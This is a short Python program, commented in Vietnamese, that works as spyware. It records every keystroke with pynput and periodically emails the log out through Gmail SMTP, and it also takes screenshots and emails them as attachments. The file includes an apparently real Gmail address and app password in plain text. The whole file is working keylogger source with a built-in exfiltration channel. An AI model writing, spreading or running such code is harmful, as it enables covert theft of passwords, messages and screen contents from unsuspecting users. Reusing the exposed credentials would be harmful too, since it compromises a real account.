import os # Đây là một thư viện  cung cấp các chức năng tương tác với hệ thống máy tính.
import time #Thư viện cung cấp các chức năng thao tác với thời gian và đợi trong quá trình thực thi chương trình
import smtplib # Thư viện này cung cấp chức năng gửi email từ Python thông qua giao thức SMTP.
import pyautogui #Đây là một thư viện  cho phép tự động hóa các hành động trên giao diện người dùng, như di chuyển chuột, nhấn phím.
from pynput.keyboard import Key, Listener #Thư viện này cung cấp các công cụ để theo dõi sự kiện của bàn phím.
from email.mime.multipart import MIMEMultipart # Thư viện cung cấp các công cụ để tạo và xử lý các phần tử MIME (Multipurpose Internet Mail Extensions) để tạo email có nhiều phần tử.
from email.mime.text import MIMEText # Cung cấp công cụ để thêm nội dung văn bản vào email.
from email.mime.image import MIMEImage # Cung cấp công cụ để thêm hình ảnh vào email.

# Keylogger setup
email = 'danganhphu2707@gmail.com' 
password = 'ylxs mgqn btno ejpa'  # Replace with your password
session = smtplib.SMTP('smtp.gmail.com', 587)
session.starttls()
session.login(email, password)
full_log = ''
email_char_limit = 20


def on_press(key):
    global full_log

    if key == Key.space or key == Key.enter:
        full_log += ' '
    elif key == Key.backspace:
        full_log = full_log[:-1]
    else:
        char = f'{key}'
        full_log += char.replace("'", "")

    if len(full_log) >= email_char_limit:
        send_log()

def send_log():
    global full_log
    session.sendmail(email, email, full_log)
    full_log = ''

# Screenshot setup
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

def send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path):
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))

    with open(attachment_path, 'rb') as attachment:
        image = MIMEImage(attachment.read(), name=os.path.basename(attachment_path))
        message.attach(image)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

# Main loop
screenshot_interval = 5  # in seconds
max_screenshots = 5

for i in range(max_screenshots):
    time.sleep(screenshot_interval)
    screenshot_path = capture_screenshot()
    send_email(email, password, email, "Screen Capture", f"Screenshot captured at {time.ctime()}", screenshot_path)

with Listener(on_press=on_press) as listener:
    listener.join()